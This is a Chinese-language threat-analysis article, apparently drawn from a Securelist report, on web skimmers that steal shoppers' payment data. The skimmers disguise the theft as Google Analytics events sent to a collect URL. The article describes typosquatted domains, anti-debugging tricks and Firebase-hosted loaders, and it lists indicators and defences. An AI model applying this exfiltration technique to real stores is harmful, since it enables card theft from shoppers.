**Web
skimming是一种常见的攻击方式，其目标通常为在线购物者。原理很简单：攻击者将恶意代码注入到受感染的站点，利用该站点收集用户输入数据并将其发送到指定服务器。如果攻击成功，攻击者就可以访问购物者的付款信息。**

## 攻击分析

攻击者通常会注册流行网络服务域名，尤其是Google Analytics(google-anatytics[.]com, google-analytcsapi[.]com, google-analytc[.]com, google-anaiytlcs[.]com, google-analytics[.]top, google-analytics[.]cm, google-analytics[.]to, google-analytics-js[.]com, googlc-analytics[.]com)。使用Google
Analytics收集访问者数据，网站所有者必须在其analytics.google.com中配置跟踪参数，获取跟踪ID（trackingId），然后将其插入网页以及跟踪代码中。多个跟踪代码可以在一个站点上同时部署，将访问者的数据发送到不同的Analytics帐户。

最近在全球发现了大约二十个受感染的站点，受害者包括欧洲、北美和南美的数字设备，化妆品，食品，零件等商店。下图显示了带有攻击者跟踪代码和跟踪ID的恶意代码：

![image.png](https://image.3001.net/images/20200629/1593393426_5ef941128c931.png!small)攻击者试图使用经典的反调试技术隐藏其恶意活动。
下图显示了检查访问者浏览器中是否启用了开发人员模式的代码。

![image.png](https://image.3001.net/images/20200629/1593393498_5ef9415adde9e.png!small)攻击者给自己留下“调试”模式下监视脚本的选项。
如果浏览器的本地存储（localStorage）包含值'debug_mode'=='11'，即使在开发人员模式，恶意代码也会执行，并向控制台写入带有错误的注释。下图为“调试模式”检查代码和R**加密算法（用于在数据发送之前对其进行加密）。  

![image.png](https://image.3001.net/images/20200629/1593393741_5ef9424d64c42.png!small)

如果通过了反调试，脚本将收集网站上输入的所有内容，使用Google Analytics对收集的数据进行加密发送， 收集和发送过程如下图所示：  

![image.png](https://image.3001.net/images/20200629/1593393795_5ef94283116e9.png!small)  

通过调用“eventAction”字段中的send事件方法来发送数据，功能签名为：

    
    
    ga('send', 'event', {
      'eventCategory': 'Category',  //Protocol Parameter: ec; Value type: text; Max Lenght: 150 Bytes
      'eventAction': 'Action',    //Protocol Parameter: ea; Value type: text; Max Lenght: 500 Bytes
      'eventLabel': 'Label'     //Protocol Parameter: el; Value type: text; Max Lenght: 500 Bytes
    });  
    

HTTP请求发送到URL

> https [：] // [www.google-analytics.com/collect](http://www.google-> analytics.com/collect)？<parameters>＆ea = packed_stolen_data＆<parameters>

下图显示了示例混淆选项，在此变体中会将来自firebasestorage.googleapis[.]com恶意脚本调用插入到受感染站点中。  

![image.png](https://image.3001.net/images/20200629/1593393965_5ef9432d02309.png!small)处理后获得如下脚本：

![image.png](https://image.3001.net/images/20200629/1593394004_5ef94354c13fb.png!small)  

## 危险性分析

Google Analytics是一项非常受欢迎的服务（根据BuiltWith数据，该服务已用于2900万个网站），并受到用户的盲目信任：管理员将*
.google-analytics.com写入Content-Security-Policy标头就可以允许该服务收集数据，无需从外部来源下载代码即可实施攻击。  

## 防范措施

1、不要从不受信任的来源安装Web应用程序和CMS组件。保持所有软件为最新，关注有关漏洞新闻，并及时修补漏洞。

2、为所有管理帐户创建强密码。

3、将用户权限限制到最低限度，跟踪有权访问服务界面的用户数量。

4、过滤用户输入的数据和查询参数防止第三方代码注入。

5、 对于电子商务站点，建议使用兼容PCI DSS支付网关。

## IOCs

> firebasestorage.googleapis[.]com/v0/b/bragvintage-f929b.appspot.com/o/*  
>
>
> firebasestorage.googleapis[.]com/v0/b/canature-5fab3.appspot.com/o/*
>
>
> firebasestorage.googleapis[.]com/v0/b/ericeirasurfskate-559bf.appspot.com/o/*
>
> firebasestorage.googleapis[.]com/v0/b/gluten-8e34e.appspot.com/o/*
>
> firebasestorage.googleapis[.]com/v0/b/laser-43e6f.appspot.com/o/*
>
> firebasestorage.googleapis[.]com/v0/b/movile-720cd.appspot.com/o/*
>
> firebasestorage.googleapis[.]com/v0/b/plumb-99e97.appspot.com/o/*
>
> firebasestorage.googleapis[.]com/v0/b/redfox-64c35.appspot.com/o/*
>
> firebasestorage.googleapis[.]com/v0/b/tictoc-9677e.appspot.com/o/*

 **参考来源**

> [securelist](https://securelist.com/web-skimming-with-google-> analytics/97414/)  
>

